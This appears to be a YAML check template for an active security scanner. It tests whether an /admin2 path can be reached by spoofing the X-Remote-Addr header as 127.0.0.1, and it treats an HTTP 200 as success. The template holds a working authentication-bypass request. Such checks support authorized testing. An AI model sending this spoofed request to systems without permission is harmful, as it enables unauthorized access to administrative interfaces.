id: bypass-007
name: 'Header bypass X-Remote-Addr'
severity: high
type: active
tags:
  - bypass
  - auth
  - headers
description: 'Reaches /admin2 via X-Remote-Addr'
requests:
  - method: GET
    path: '{{BaseURL}}/admin2'
    sendHeaders:
      X-Remote-Addr: '127.0.0.1'
    matchers:
      - type: status
        status: [200]
